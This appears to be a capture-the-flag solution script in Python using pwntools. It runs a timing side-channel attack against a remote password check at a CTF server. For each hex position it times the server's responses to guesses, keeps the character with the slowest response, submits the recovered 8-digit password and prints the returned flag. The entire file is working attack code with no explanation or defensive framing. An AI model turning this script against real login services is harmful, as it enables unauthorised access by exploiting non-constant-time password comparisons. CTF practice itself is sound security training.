from pwn import *
import time
import string

# Server details
host = 'challenge.ctf.games'
port = 31637
timeout = 90  # Adjust if necessary

# Character set for guessing
charset = '0123456789abcdef'

# Function to send a guess and measure the response time without closing the connection
def send_guess(conn, guess):
    conn.recvuntil(b": ")  # Wait for the prompt (byte-based)
    start = time.time()
    conn.sendline(guess.encode())  # Send the guess encoded as bytes
    response = conn.recvline()  # Read the server's response
    elapsed = time.time() - start
    return elapsed, response.decode()  # Decode the response back to a string for processing

# Function to find the password using timing attack without closing the connection
def find_password(conn):
    password = ""
    password_length = 8  # The length of the hexadecimal password (4 bytes -> 8 hex digits)

    for i in range(password_length):
        max_time = 0
        best_char = ""
        
        # Try each character in the charset and measure the time taken
        for char in charset:
            guess = password + char + "0" * (password_length - len(password) - 1)  # Fill remaining with 0s
            elapsed, response = send_guess(conn, guess)

            # Keep track of the character that results in the longest response time
            if elapsed > max_time:
                max_time = elapsed
                best_char = char

            print(f"Trying {guess} => Time: {elapsed:.5f} seconds, Response: {response.strip()}")

        # Add the best character to the password
        password += best_char
        print(f"Found {i + 1} characters: {password}")
    
    return password

def main():
    conn = remote(host, port, timeout=timeout)  # Open a persistent connection
    print("Connection established...")

    # Discover the password using the timing attack
    password = find_password(conn)
    
    print(f"Discovered password: {password}")

    # Send the discovered password to the server
    conn.recvuntil(b": ")  # Wait for the final prompt (byte-based handling)
    conn.sendline(password.encode())  # Send the password as bytes

    # Receive the flag or success message after sending the password
    flag = conn.recvline().decode().strip()  # Decode the flag as a string
    print(f"Flag: {flag}")

    # Keep the connection interactive if needed
    conn.interactive()

if __name__ == "__main__":
    main()
